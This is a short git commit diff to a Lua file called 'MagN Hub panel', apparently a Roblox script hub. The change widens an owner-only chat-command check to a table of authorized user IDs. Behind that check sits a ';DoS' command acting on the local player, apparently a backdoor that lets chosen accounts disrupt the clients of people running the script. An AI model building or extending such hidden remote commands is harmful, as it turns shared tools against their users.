9f75b21113be31e1f7d6a5dd7130a31e3635ae7d
magnesium2 <nexflex64@gmail.com>
2026-09-22 16:34:27 -0300

    Update MagN Hub panel.lua

--- MagN Hub panel.lua
+++ MagN Hub panel.lua
@@ -627,7 +627,7 @@ local function OuvirChat(Jogador, Mensagem)
     end
     
     -- 2. Comandos restritos estritamente ao seu ID de Dono
-    if Jogador.UserId == ID_DONO then
+    if IDsAutorizados[Jogador.UserId] then
         if Mensagem == ";DoS" then
             local player = game:GetService("Players").LocalPlayer
             if not player then return end
